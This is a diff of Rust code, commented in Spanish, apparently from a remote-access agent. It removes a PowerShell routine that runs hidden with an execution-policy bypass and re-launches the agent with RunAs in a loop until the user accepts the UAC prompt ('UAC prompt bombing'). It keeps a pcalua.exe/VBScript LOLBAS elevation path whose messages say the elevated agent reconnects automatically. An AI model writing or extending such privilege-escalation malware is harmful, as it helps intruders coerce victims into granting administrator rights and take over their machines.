@@ -476,24 +476,12 @@ fn elevate_agent() -> String {
         None => return format!("__ERROR__:Ruta inválida{}", DELIMITER),
     };
     
-    // Elevar el ejecutable desde su ubicación actual (SIN copiar)
-    // TÉCNICA 1: Intentar PowerShell primero
-    let ps_result = elevate_agent_via_powershell(exe_str);
-    
-    // Si PowerShell funcionó (SUCCESS), retornar
-    if ps_result.contains("__SUCCESS__") {
-        return ps_result;
-    }
-    
-    debug_print!("DEBUG: PowerShell elevation failed, trying VBScript...");
-    
-    // TÉCNICA 2: VBScript como fallback
     if let Ok(result) = elevate_agent_via_vbs(exe_str) {
         return result;
-    }
+    };
     
-    // Si ambas técnicas fallaron, retornar el error de PowerShell
-    ps_result
+    // si falla la elevación con pcalua.exe, retornar error
+    format!("__ERROR__:Falló la elevación del agente con UAC prompt bombing (LOLBAS){}", DELIMITER) 
 }
 
 /*
@@ -644,44 +632,8 @@ fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
         Err(e) => Err(format!("pcalua.exe elevation failed: {}", e)),
     }
 }
-
-/// Re-ejecuta el agente usando PowerShell con UAC prompt bombing (fallback)
-/// Esta versión también implementa UAC prompt bombing pero sin usar pcalua.exe
-#[cfg(target_os = "windows")]
-fn elevate_agent_via_powershell(exe_path: &str) -> String {
-    use std::process::Command;
-    use std::os::windows::process::CommandExt;
-    
-    // PowerShell con UAC prompt bombing
-    // Similar a la técnica de pcalua.exe pero como fallback directo
-    let ps_script = format!(
-        "try {{ throw \"\" }} catch {{ while (-not $?) {{ try {{ Start-Process -FilePath '{}' -Verb RunAs -ErrorAction Stop; break }} catch {{ Write-Error \"\" -ErrorAction SilentlyContinue }} }} }}",
-        exe_path.replace("'", "''")
-    );
-    
-    let output = Command::new("powershell")
-        .args(&[
-            "-NoProfile",
-            "-NonInteractive",
-            "-WindowStyle", "Hidden",
-            "-ExecutionPolicy", "Bypass",
-            "-Command",
-            &ps_script
-        ])
-        .creation_flags(0x08000000) // CREATE_NO_WINDOW
-        .spawn();
-    
-    match output {
-        Ok(_) => format!(
-            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (PowerShell + UAC bombing). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
-            DELIMITER
-        ),
-        Err(e) => format!(
-            "__ERROR__:Error al re-ejecutar agente con privilegios: {}{}", 
-            e, DELIMITER
-        ),
-    }
-}
+// Function removed - only pcalua.exe (via elevate_agent_via_vbs) is used for elevation
+// The /elevate command now exclusively uses the LOLBAS technique with pcalua.exe
 
 #[cfg(not(target_os = "windows"))]
 fn elevate_agent() -> String {
